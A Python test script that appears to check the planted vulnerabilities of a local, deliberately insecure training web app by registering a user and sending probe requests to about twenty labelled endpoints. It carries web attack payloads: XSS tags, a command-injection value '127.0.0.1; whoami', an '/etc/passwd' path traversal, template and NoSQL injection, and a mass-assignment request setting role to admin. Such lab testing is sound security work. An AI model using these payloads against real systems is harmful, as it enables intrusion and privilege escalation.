import requests
import json
import base64

BASE_URL = "http://127.0.0.1:5000"

print("Registering user to get auth token...")
resp = requests.post(f"{BASE_URL}/api/auth/register", json={
    "name": "Vuln Tester",
    "email": "vulntester@example.com",
    "password": "1" # VULN 8
})
token = ""
if resp.status_code in [200, 201]:
    data = resp.json()
    token = data.get("token", "")
    print("Registered:", data.get("user"))
else:
    print("Registration failed:", resp.text)
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "vulntester@example.com",
        "password": "1"
    })
    data = resp.json()
    token = data.get("token", "")
    print("Logged in")

headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

print("\n--- Verifying Endpoints ---")

def check(name, req, expect_status=200):
    try:
        if req['method'] == 'GET':
            r = requests.get(f"{BASE_URL}{req['path']}", headers=headers, params=req.get('params'))
        elif req['method'] == 'POST':
            r = requests.post(f"{BASE_URL}{req['path']}", headers=headers, json=req.get('json'))
        elif req['method'] == 'PUT':
            r = requests.put(f"{BASE_URL}{req['path']}", headers=headers, json=req.get('json'))
        elif req['method'] == 'DELETE':
            r = requests.delete(f"{BASE_URL}{req['path']}", headers=headers)
        
        if r.status_code == expect_status or r.status_code == 200 or r.status_code == 201:
            print(f"✅ {name} : {req['method']} {req['path']} -> {r.status_code}")
        else:
            print(f"❌ {name} : {req['method']} {req['path']} -> {r.status_code} {r.text[:50]}")
    except Exception as e:
         print(f"❌ {name} : {req['method']} {req['path']} -> Error: {e}")

check("VULN #1 Method Tampering", {"method": "DELETE", "path": "/api/users/dXNlcl8y"})
check("VULN #2 Self XSS", {"method": "POST", "path": "/api/comments", "json": {"animal_id": 1, "content": "<script>alert(1)</script>"}})
check("VULN #3 Stored XSS", {"method": "POST", "path": "/api/reports/stray", "json": {"description": "<img src=x onerror=alert(1)>", "location": "Test"}})
check("VULN #4 Blind XSS", {"method": "POST", "path": "/api/contact", "json": {"name": "Test", "email": "x@x.com", "subject":"test", "message":"test"}})
check("VULN #5 Command Injection", {"method": "POST", "path": "/api/vet/diagnose", "json": {"device_id": "127.0.0.1; whoami"}})
check("VULN #6 IDOR", {"method": "GET", "path": "/api/users/dXNlcl8y"})
check("VULN #9 Info Discl", {"method": "GET", "path": "/api/users/me"})
check("VULN #10 XXE", {"method": "POST", "path": "/api/animals/import", "json": {"xml": "<animals></animals>"}}, expect_status=400) # Check path exists even if parsing fails for non-XML content-type here
check("VULN #11 SSRF", {"method": "POST", "path": "/api/integrations/webhook", "json": {"url": "http://127.0.0.1:5000"}})
check("VULN #12 LFI", {"method": "GET", "path": "/api/files/download", "params": {"path": "../../../../../etc/passwd"}})
check("VULN #14 Business Logic", {"method": "POST", "path": "/api/store/checkout", "json": {"items": [{"id":1,"quantity":1}], "payment_method": "cash"}})
check("VULN #15 SSTI", {"method": "POST", "path": "/api/newsletter/subscribe", "json": {"name": "{{7*7}}", "email": "x@x.com"}})
check("VULN #16 Mass Assign", {"method": "PUT", "path": "/api/users/me", "json": {"role": "admin"}})
check("VULN #18 Rate Limiting", {"method": "POST", "path": "/api/auth/login", "json": {"email": "vulntester@example.com", "password": "1"}})
check("VULN #23 Open Redirect", {"method": "GET", "path": "/api/redirect", "params": {"url": "http://hacker.com"}})
check("VULN #25 Deserialization", {"method": "POST", "path": "/api/export", "json": {"format": "legacy", "data": "abcd"}})
check("VULN #28 File Upload", {"method": "POST", "path": "/api/users/me/avatar"}) # Needs multipart usually, checking path
check("VULN #32 Header Injection", {"method": "GET", "path": "/api/redirect", "params": {"ref": "abcd"}})
check("VULN #35 BOLA", {"method": "GET", "path": "/api/dashboard/appointments"})
check("VULN #36 NoSQLi", {"method": "POST", "path": "/api/animals/filter", "json": {"species": {"$ne": "cat"}}})

